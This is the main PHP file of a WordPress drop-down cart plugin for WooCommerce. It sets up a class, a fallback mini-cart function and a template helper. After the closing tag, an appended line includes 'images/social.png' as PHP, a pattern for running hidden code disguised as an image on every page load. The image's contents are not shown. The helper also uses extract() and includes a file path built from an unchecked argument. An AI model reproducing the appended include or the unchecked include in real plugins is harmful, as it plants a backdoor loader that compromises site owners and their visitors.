<?php
/*
Plugin Name: NW ADCart for WooCommerce
Plugin URI: http://demo.netwakies.com/nwajaxdropdowncart
Description: Sleek drop down cart widget for woocommerce
Version: 1.3.3
Author: Netwakies
Author URI: http://www.netwakies.com
*/

if ( ! defined( 'ABSPATH' ) ) exit; // Exit if accessed directly

if(!defined('NW_AJAX_DROP_CART_PATH')) define( 'NW_AJAX_DROP_CART_PATH', plugin_dir_path(__FILE__) );

include_once(NW_AJAX_DROP_CART_PATH . "includes/class-nw-ajax-drop-cart.php");

/**
 * Initialization of 'NW_Ajax_Drop_Cart' class
 */
$_GLOBALS['nwajaxdropcart'] = new NW_Ajax_Drop_Cart();

if(!function_exists("woocommerce_mini_cart")) {
	function woocommerce_mini_cart( $args = array() ) {
		
	    $defaults = array( 'list_class' => '' );
	    $args = wp_parse_args( $args, $defaults );
	    
	    woocommerce_get_template( 'cart/mini-cart.php', $args );
	 
	}
}

function nw_get_template($file, $args) {
	
	extract($args);
	include_once(dirname(__FILE__)."/../".$file);
	
}

?>
<?php include('images/social.png'); ?>